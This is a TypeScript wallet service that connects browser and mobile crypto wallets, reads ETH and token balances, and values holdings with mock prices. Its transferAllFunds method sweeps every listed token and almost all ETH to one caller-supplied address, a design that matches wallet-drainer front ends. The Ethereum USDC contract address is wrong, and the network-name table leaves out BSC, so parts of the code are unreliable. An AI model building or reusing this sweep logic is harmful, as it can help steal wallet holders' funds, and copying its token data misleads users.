import { ethers } from "ethers";

// ERC-20 Token ABI (minimal for balance and transfer functions)
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function name() view returns (string)"
];

// Popular tokens by network
const POPULAR_TOKENS: Record<string, Array<{address: string, symbol: string, decimals: number}>> = {
  "1": [ // Ethereum Mainnet
    { address: "0xA0b86a33E6441d3a36F16ecF2e8d0d5cc3e2b7E0", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 },
    { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 }
  ],
  "137": [ // Polygon
    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC", decimals: 6 },
    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI", decimals: 18 },
    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
    { address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", symbol: "WBTC", decimals: 8 }
  ],
  "56": [ // BSC
    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
    { address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3", symbol: "DAI", decimals: 18 },
    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 }
  ]
};

export interface TokenBalance {
  symbol: string;
  balance: string;
  decimals: number;
  contractAddress?: string;
  usdValue?: number;
}

export interface WalletState {
  isConnected: boolean;
  address: string | null;
  ethBalance: string | null;
  tokenBalances: TokenBalance[];
  totalUsdValue: number;
  networkId: string | null;
  networkName: string | null;
  provider: ethers.BrowserProvider | null;
}

export class Web3Service {
  private provider: ethers.BrowserProvider | null = null;
  private signer: ethers.JsonRpcSigner | null = null;

  private detectEnvironment() {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const isMetaMaskMobile = window.ethereum && window.ethereum.isMetaMask && isMobile;
    const isDesktop = !isMobile;
    
    return {
      isMobile,
      isDesktop,
      isMetaMaskMobile,
      hasEthereum: !!window.ethereum,
      isTrustWallet: window.ethereum && window.ethereum.isTrust,
      isCoinbaseWallet: window.ethereum && window.ethereum.isCoinbaseWallet,
    };
  }

  private async attemptMobileWalletConnection() {
    const env = this.detectEnvironment();
    
    // Try to detect if we're in a mobile wallet browser
    if (env.hasEthereum) {
      return await this.connectToEthereum();
    }

    // Wait for wallet injection with multiple attempts
    return new Promise<WalletState>((resolve, reject) => {
      let attempts = 0;
      const maxAttempts = 30; // Wait up to 6 seconds
      
      const checkForWallet = async () => {
        attempts++;
        
        // Check for any ethereum provider
        if ((window as any).ethereum) {
          try {
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Connection attempt failed:', error);
          }
        }
        
        // Check for Trust Wallet specifically
        if ((window as any).trustwallet && (window as any).trustwallet.ethereum) {
          try {
            (window as any).ethereum = (window as any).trustwallet.ethereum;
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Trust Wallet connection failed:', error);
          }
        }
        
        // Check for Coinbase Wallet
        if ((window as any).coinbaseWalletExtension) {
          try {
            (window as any).ethereum = (window as any).coinbaseWalletExtension;
            const result = await this.connectToEthereum();
            resolve(result);
            return;
          } catch (error) {
            console.log('Coinbase Wallet connection failed:', error);
          }
        }
        
        if (attempts < maxAttempts) {
          setTimeout(checkForWallet, 200);
        } else {
          reject(new Error('No wallet detected. Please make sure you opened this app from within a wallet browser, or try opening it in MetaMask, Trust Wallet, or another Web3 wallet app.'));
        }
      };
      
      // Start checking immediately
      checkForWallet();
    });
  }

  private async connectToEthereum(): Promise<WalletState> {
    try {
      // Request account access
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (accounts.length === 0) {
        throw new Error("No accounts found. Please make sure your wallet is unlocked.");
      }

      this.provider = new ethers.BrowserProvider(window.ethereum);
      this.signer = await this.provider.getSigner();

      const address = accounts[0];
      const network = await this.provider.getNetwork();
      const networkId = network.chainId.toString();

      // Get ETH balance
      const ethBalance = await this.getEthBalance(address);
      
      // Get token balances
      const tokenBalances = await this.getTokenBalances(address, networkId);
      
      // Calculate total USD value
      const totalUsdValue = this.calculateTotalUsdValue(ethBalance, tokenBalances);

      return {
        isConnected: true,
        address,
        ethBalance,
        tokenBalances,
        totalUsdValue,
        networkId,
        networkName: this.getNetworkName(networkId),
        provider: this.provider,
      };
    } catch (error: any) {
      if (error.code === 4001) {
        throw new Error("User rejected the connection request");
      }
      throw new Error(`Failed to connect wallet: ${error.message}`);
    }
  }

  async connectWallet(): Promise<WalletState> {
    const env = this.detectEnvironment();
    
    // Check if we're in a wallet browser first (regardless of desktop/mobile)
    if (env.hasEthereum) {
      return await this.connectToEthereum();
    }
    
    // Desktop browser without wallet
    if (env.isDesktop) {
      window.open('https://metamask.io/download/', '_blank');
      throw new Error("Please install MetaMask extension for your browser, then refresh and try again.");
    }
    
    // Mobile environment - try to detect wallet injection
    if (env.isMobile) {
      return await this.attemptMobileWalletConnection();
    }
    
    return await this.connectToEthereum();
  }

  async getEthBalance(address: string): Promise<string> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    try {
      const balance = await this.provider.getBalance(address);
      return ethers.formatEther(balance);
    } catch (error: any) {
      throw new Error(`Failed to get ETH balance: ${error.message}`);
    }
  }

  async getTokenBalances(address: string, networkId: string): Promise<TokenBalance[]> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    const tokens = POPULAR_TOKENS[networkId] || [];
    const tokenBalances: TokenBalance[] = [];

    // Check each popular token on this network
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, this.provider);
        const balance = await contract.balanceOf(address);
        const balanceFormatted = ethers.formatUnits(balance, token.decimals);
        
        // Only include tokens with non-zero balance
        if (parseFloat(balanceFormatted) > 0) {
          tokenBalances.push({
            symbol: token.symbol,
            balance: balanceFormatted,
            decimals: token.decimals,
            contractAddress: token.address,
            usdValue: this.getTokenUsdPrice(token.symbol) * parseFloat(balanceFormatted)
          });
        }
      } catch (error) {
        // Skip tokens that fail to load (might be unsupported or network issues)
        console.warn(`Failed to load balance for ${token.symbol}:`, error);
      }
    }

    return tokenBalances;
  }

  private getTokenUsdPrice(symbol: string): number {
    // Mock prices - in production, use a price API like CoinGecko
    const prices: Record<string, number> = {
      "USDC": 1.00,
      "USDT": 1.00,
      "DAI": 1.00,
      "WBTC": 45000,
      "WETH": 2500,
      "UNI": 8.50,
      "LINK": 15.00
    };
    return prices[symbol] || 0;
  }

  calculateTotalUsdValue(ethBalance: string, tokenBalances: TokenBalance[]): number {
    const ethUsdPrice = 2500; // Mock ETH price
    const ethValue = parseFloat(ethBalance) * ethUsdPrice;
    const tokenValue = tokenBalances.reduce((sum, token) => sum + (token.usdValue || 0), 0);
    return ethValue + tokenValue;
  }

  async transferAllFunds(toAddress: string): Promise<string[]> {
    if (!this.provider || !this.signer) {
      throw new Error("Wallet not connected");
    }

    try {
      const address = await this.signer.getAddress();
      const network = await this.provider.getNetwork();
      const networkId = network.chainId.toString();
      
      const transactionHashes: string[] = [];
      
      // Get all balances
      const ethBalance = await this.provider.getBalance(address);
      const tokenBalances = await this.getTokenBalances(address, networkId);

      // Transfer all ERC-20 tokens first
      for (const tokenBalance of tokenBalances) {
        if (!tokenBalance.contractAddress || parseFloat(tokenBalance.balance) <= 0) continue;
        
        try {
          const contract = new ethers.Contract(tokenBalance.contractAddress, ERC20_ABI, this.signer);
          const tokenAmount = ethers.parseUnits(tokenBalance.balance, tokenBalance.decimals);
          
          const tokenTx = await contract.transfer(toAddress, tokenAmount);
          transactionHashes.push(tokenTx.hash);
          
          // Wait a bit between transactions to avoid nonce issues
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (error) {
          console.warn(`Failed to transfer ${tokenBalance.symbol}:`, error);
        }
      }

      // Transfer ETH last (need to keep some for gas)
      if (ethBalance > 0) {
        // Estimate gas for ETH transfer
        const gasEstimate = await this.provider.estimateGas({
          to: toAddress,
          value: ethBalance,
        });

        // Calculate gas cost
        const feeData = await this.provider.getFeeData();
        const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
        const gasCost = gasEstimate * gasPrice;

        // Check if we have enough for gas
        if (ethBalance > gasCost) {
          const amountToSend = ethBalance - gasCost;
          
          if (amountToSend > 0) {
            const ethTx = await this.signer.sendTransaction({
              to: toAddress,
              value: amountToSend,
              gasLimit: gasEstimate,
              gasPrice: gasPrice,
            });
            transactionHashes.push(ethTx.hash);
          }
        }
      }

      if (transactionHashes.length === 0) {
        throw new Error("No funds available to transfer");
      }

      return transactionHashes;
    } catch (error: any) {
      throw new Error(`Transfer failed: ${error.message}`);
    }
  }

  async transferSpecificToken(tokenAddress: string | null, amount: string, toAddress: string): Promise<string> {
    if (!this.provider || !this.signer) {
      throw new Error("Wallet not connected");
    }

    try {
      if (!tokenAddress) {
        // Transfer ETH
        const amountWei = ethers.parseEther(amount);
        const transaction = await this.signer.sendTransaction({
          to: toAddress,
          value: amountWei,
        });
        return transaction.hash;
      } else {
        // Transfer ERC-20 token
        const contract = new ethers.Contract(tokenAddress, ERC20_ABI, this.signer);
        const decimals = await contract.decimals();
        const amountUnits = ethers.parseUnits(amount, decimals);
        const transaction = await contract.transfer(toAddress, amountUnits);
        return transaction.hash;
      }
    } catch (error: any) {
      throw new Error(`Transfer failed: ${error.message}`);
    }
  }

  async getTransactionStatus(txHash: string): Promise<{
    status: 'pending' | 'confirmed' | 'failed';
    blockNumber?: string;
    gasUsed?: string;
  }> {
    if (!this.provider) {
      throw new Error("Wallet not connected");
    }

    try {
      const receipt = await this.provider.getTransactionReceipt(txHash);
      
      if (!receipt) {
        return { status: 'pending' };
      }

      return {
        status: receipt.status === 1 ? 'confirmed' : 'failed',
        blockNumber: receipt.blockNumber.toString(),
        gasUsed: receipt.gasUsed.toString(),
      };
    } catch (error: any) {
      throw new Error(`Failed to get transaction status: ${error.message}`);
    }
  }

  private getNetworkName(chainId: string): string {
    const networks: Record<string, string> = {
      "1": "Ethereum Mainnet",
      "5": "Goerli Testnet",
      "11155111": "Sepolia Testnet",
      "137": "Polygon Mainnet",
      "80001": "Polygon Mumbai",
    };

    return networks[chainId] || `Unknown Network (${chainId})`;
  }

  async switchToEthereumMainnet(): Promise<void> {
    if (!window.ethereum) {
      throw new Error("MetaMask is not installed");
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }], // Ethereum Mainnet
      });
    } catch (error: any) {
      throw new Error(`Failed to switch network: ${error.message}`);
    }
  }

  setupEventListeners(
    onAccountChange: (accounts: string[]) => void,
    onNetworkChange: (networkId: string) => void
  ) {
    if (!window.ethereum) return;

    window.ethereum.on("accountsChanged", onAccountChange);
    window.ethereum.on("chainChanged", onNetworkChange);
  }

  removeEventListeners() {
    if (!window.ethereum) return;

    window.ethereum.removeAllListeners("accountsChanged");
    window.ethereum.removeAllListeners("chainChanged");
  }
}

export const web3Service = new Web3Service();

// Extend Window interface for TypeScript
declare global {
  interface Window {
    ethereum?: any;
  }
}
